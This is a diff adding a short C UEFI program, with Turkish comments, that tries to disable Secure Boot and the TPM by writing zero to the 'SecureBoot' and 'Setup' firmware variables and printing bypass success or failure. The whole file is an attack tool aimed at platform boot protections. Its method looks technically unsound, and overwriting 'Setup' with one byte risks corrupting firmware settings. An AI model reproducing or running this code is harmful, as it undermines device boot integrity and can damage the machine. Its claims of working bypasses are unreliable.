@@ -1,0 +1,36 @@
+#include <efi.h>
+#include <efilib.h>
+
+EFI_STATUS EFIAPI efi_main(EFI_HANDLE ImageHandle, EFI_SYSTEM_TABLE *SystemTable) {
+    InitializeLib(ImageHandle, SystemTable);
+
+    EFI_STATUS Status;
+    EFI_BOOT_SERVICES *BootServices = SystemTable->BootServices;
+
+    // Secure Boot'u devre dışı bırak
+    EFI_GUID GlobalVariable = EFI_GLOBAL_VARIABLE;
+    UINT8 SecureBootDisable = 0x00;
+    Status = SystemTable->RuntimeServices->SetVariable(L"SecureBoot", &GlobalVariable,
+                                                       EFI_VARIABLE_NON_VOLATILE | EFI_VARIABLE_BOOTSERVICE_ACCESS | EFI_VARIABLE_RUNTIME_ACCESS,
+                                                       sizeof(SecureBootDisable), &SecureBootDisable);
+
+    if (EFI_ERROR(Status)) {
+        Print(L"Secure Boot Bypass Başarısız\n");
+    } else {
+        Print(L"Secure Boot Bypass Başarılı\n");
+    }
+
+    // TPM'yi devre dışı bırak
+    UINT8 TpmDisable = 0x00;
+    Status = SystemTable->RuntimeServices->SetVariable(L"Setup", &GlobalVariable,
+                                                       EFI_VARIABLE_NON_VOLATILE | EFI_VARIABLE_BOOTSERVICE_ACCESS | EFI_VARIABLE_RUNTIME_ACCESS,
+                                                       sizeof(TpmDisable), &TpmDisable);
+
+    if (EFI_ERROR(Status)) {
+        Print(L"TPM Bypass Başarısız\n");
+    } else {
+        Print(L"TPM Bypass Başarılı\n");
+    }
+
+    return EFI_SUCCESS;
+}
